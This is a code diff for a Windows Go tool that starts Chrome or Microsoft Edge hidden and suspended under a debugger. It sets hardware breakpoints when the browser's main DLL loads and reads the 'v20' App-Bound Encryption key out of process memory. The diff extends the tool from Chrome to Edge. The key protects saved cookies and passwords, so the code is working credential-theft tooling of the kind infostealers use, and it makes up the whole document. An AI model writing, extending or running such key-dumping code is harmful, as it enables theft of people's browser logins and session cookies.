@@ -1,5 +1,11 @@
 //go:build windows
 
+// TODO
+// multi profiles (probably impossible)
+// spawn immediately under debugger
+// if can't get even lea then terminate
+// readme for edge
+
 package main
 
 import (
@@ -25,6 +31,16 @@ const (
 	DBG_CONTINUE              uint32 = 0x00010002
 )
 
+var (
+	programFiles    = os.Getenv("ProgramFiles")
+	programFilesX86 = os.Getenv("ProgramFiles(x86)")
+
+	chromeExe = filepath.Join(programFiles, "Google", "Chrome", "Application", "chrome.exe")
+	msedgeExe = filepath.Join(programFilesX86, "Microsoft", "Edge", "Application", "msedge.exe")
+
+	browsers = [2]string{chromeExe, msedgeExe}
+)
+
 type SectionInfo struct {
 	Name           string
 	VirtualAddress uint32
@@ -33,52 +49,59 @@ type SectionInfo struct {
 }
 
 func main() {
-	programFiles := os.Getenv("ProgramFiles")
-	chromeExe := filepath.Join(programFiles, "Google", "Chrome", "Application", "chrome.exe")
+	for _, exeFile := range browsers {
+		appName, err := windows.UTF16PtrFromString(exeFile)
+		if err != nil {
+			fmt.Println("UTF16PtrFromString:", err)
+			return
+		}
 
-	appName, err := windows.UTF16PtrFromString(chromeExe)
-	if err != nil {
-		fmt.Println("UTF16PtrFromString:", err)
-		return
-	}
+		if _, err := os.Stat(exeFile); err != nil {
+			continue
+		}
 
-	var si windows.StartupInfo
-	si.Cb = uint32(unsafe.Sizeof(si))
-	si.Flags = windows.STARTF_USESHOWWINDOW
-	si.ShowWindow = windows.SW_HIDE
+		var si windows.StartupInfo
+		si.Cb = uint32(unsafe.Sizeof(si))
+		si.Flags = windows.STARTF_USESHOWWINDOW
+		si.ShowWindow = windows.SW_HIDE
 
-	var pi windows.ProcessInformation // processId from here
+		var pi windows.ProcessInformation // processId from here
 
-	err = windows.CreateProcess(
-		appName,
-		nil,
-		nil,
-		nil,
-		false,
-		windows.CREATE_SUSPENDED,
-		nil,
-		nil,
-		&si,
-		&pi,
-	)
+		err = windows.CreateProcess(
+			appName,
+			nil,
+			nil,
+			nil,
+			false,
+			windows.CREATE_SUSPENDED,
+			nil,
+			nil,
+			&si,
+			&pi,
+		)
 
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
 
-	defer windows.CloseHandle(pi.Process)
-	defer windows.CloseHandle(pi.Thread)
+		defer windows.CloseHandle(pi.Process)
+		defer windows.CloseHandle(pi.Thread)
 
-	fmt.Printf("created suspended: pid=%d tid=%d\n", pi.ProcessId, pi.ThreadId)
+		fmt.Printf("created suspended: pid=%d tid=%d\n", pi.ProcessId, pi.ThreadId)
 
-	err = startDebug(&pi)
-	if err != nil {
-		fmt.Println(err)
+		if strings.Compare(exeFile, msedgeExe) == 0 {
+			err = startDebug(&pi, true)
+		} else {
+			err = startDebug(&pi, false)
+		}
+		if err != nil {
+			fmt.Println(err)
+		}
 	}
 }
 
-func startDebug(pi *windows.ProcessInformation) error {
+func startDebug(pi *windows.ProcessInformation, isEdge bool) error {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -123,7 +146,7 @@ func startDebug(pi *windows.ProcessInformation) error {
 				name, err := getFinalPathNameByHandle(info.HFile)
 				defer windows.CloseHandle(windows.Handle(info.HFile)) // essential to close handle
 
-				if err == nil && strings.HasSuffix(strings.ToLower(name), "chrome.dll") {
+				if err == nil && strings.HasSuffix(strings.ToLower(name), "chrome.dll") || (isEdge && strings.HasSuffix(strings.ToLower(name), "msedge.dll")) {
 					baseDllAddr = info.LpBaseOfDll
 
 					rdata, err := findSection(pi.Process, baseDllAddr, ".rdata")
@@ -152,7 +175,6 @@ func startDebug(pi *windows.ProcessInformation) error {
 						break
 					}
 				}
-
 			}
 		case EXCEPTION_DEBUG_EVENT:
 			info := (*types.EXCEPTION_DEBUG_INFO)(unsafe.Pointer(&debugEvent.U[0]))
@@ -169,13 +191,17 @@ func startDebug(pi *windows.ProcessInformation) error {
 					break
 				}
 
-				hBpThread, err := windows.OpenThread(windows.THREAD_GET_CONTEXT|windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION, false, debugEvent.DwThreadId)
+				hBpThread, err := windows.OpenThread(
+					windows.THREAD_GET_CONTEXT|windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
+					false,
+					debugEvent.DwThreadId,
+				)
 				if err != nil {
 					fmt.Printf("failed to STATUS_SINGLE_STEP: %v", err)
 					break
 				}
 
-				key, err := dumpAbeKeyFromCtx(pi.Process, hBpThread)
+				key, err := dumpAbeKeyFromCtx(pi.Process, hBpThread, isEdge)
 				windows.CloseHandle(hBpThread)
 				if err != nil {
 					fmt.Printf("failed to get v20key: %v", err)
@@ -188,6 +214,7 @@ func startDebug(pi *windows.ProcessInformation) error {
 				if err := windows.TerminateProcess(pi.Process, 0); err != nil {
 					fmt.Printf("fail to terminate: %v\n", err)
 				}
+				fmt.Printf("terminated successfully pid: %v\n", pi.ProcessId)
 				return nil
 			default:
 				continueStatus = 0x80010001
@@ -199,8 +226,7 @@ func startDebug(pi *windows.ProcessInformation) error {
 	}
 }
 
-// todo , isEdge bool
-func dumpAbeKeyFromCtx(hProcess, hThread windows.Handle) ([]byte, error) {
+func dumpAbeKeyFromCtx(hProcess, hThread windows.Handle, isEdge bool) ([]byte, error) {
 	var context types.AMD64CONTEXT
 	context.ContextFlags = 0x1000007
 	ret, err := GetThreadContext(hThread, &context)
@@ -208,7 +234,7 @@ func dumpAbeKeyFromCtx(hProcess, hThread windows.Handle) ([]byte, error) {
 		return nil, err
 	}
 
-	keyPtrReg := context.R15
+	var keyPtrReg uint64 = context.R15
 
 	buf := make([]byte, 16) // r15 byte address
 	var bytesRead uintptr
@@ -222,16 +248,31 @@ func dumpAbeKeyFromCtx(hProcess, hThread windows.Handle) ([]byte, error) {
 		return nil, fmt.Errorf("ReadProcessMemory r15: %w", err)
 	}
 	buf = buf[:bytesRead]
+	fmt.Printf("%x\n", buf)
 
-	v20Key := make([]byte, 0x20)
-	if err := windows.ReadProcessMemory(
-		hProcess,
-		uintptr(binary.LittleEndian.Uint64(buf)),
-		&v20Key[0],
-		0x20,
-		&bytesRead,
-	); err != nil {
-		return nil, fmt.Errorf("ReadProcessMemory key: %w", err)
+	v20Key := make([]byte, 0x40)
+	if isEdge {
+		if err := windows.ReadProcessMemory(
+			hProcess,
+			uintptr(binary.LittleEndian.Uint64(buf)),
+			&v20Key[0],
+			0x20,
+			&bytesRead,
+		); err != nil {
+			return nil, fmt.Errorf("ReadProcessMemory key: %w", err)
+		}
+		v20Key = v20Key[:0x20]
+	} else {
+		if err := windows.ReadProcessMemory(
+			hProcess,
+			uintptr(binary.LittleEndian.Uint64(buf)),
+			&v20Key[0],
+			0x40,
+			&bytesRead,
+		); err != nil {
+			return nil, fmt.Errorf("ReadProcessMemory key: %w", err)
+		}
+		v20Key = v20Key[0x20:]
 	}
 
 	return v20Key, nil
@@ -258,6 +299,7 @@ func setHwbpOnAllThreads(hProcess windows.Handle, bpAddr uint64, clear bool) err
 
 		_, err = setHwbpOnThread(newThread, bpAddr, clear)
 		if err != nil {
+			fmt.Println(err.Error())
 			fmt.Printf("setHwbp on thread %v: %v\n", hPrevThread, err)
 		}
 	}
